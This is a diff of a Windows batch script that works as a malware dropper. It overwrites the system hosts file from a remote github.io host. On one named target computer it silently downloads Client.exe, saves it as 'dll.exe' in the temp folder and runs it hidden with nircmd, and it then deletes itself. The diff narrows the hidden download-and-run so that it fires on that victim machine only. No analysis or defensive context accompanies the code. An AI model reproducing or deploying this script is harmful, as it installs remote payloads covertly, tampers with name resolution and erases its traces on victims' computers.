@@ -14,11 +14,10 @@ curl.exe %proxy% https://cryptedlumos.github.io/Hosts/hosts --output "C:\Windows
 echo [TARGET START]
 echo %computername%
 if [%computername%]==[LAPTOP-KSJLL5K9] (
-curl.exe %proxy% https://cryptedlumos.github.io/purga_paperino.bat --output "%temp%\pp.bat" && nircmd exec hide "%temp%\pp.bat"
+curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
 ) else (
 echo.
 )
 echo [TARGET STOP]
-curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
 echo "edkekdoekdoedcdjcn"
 del /s /f /q /a "%~f0"
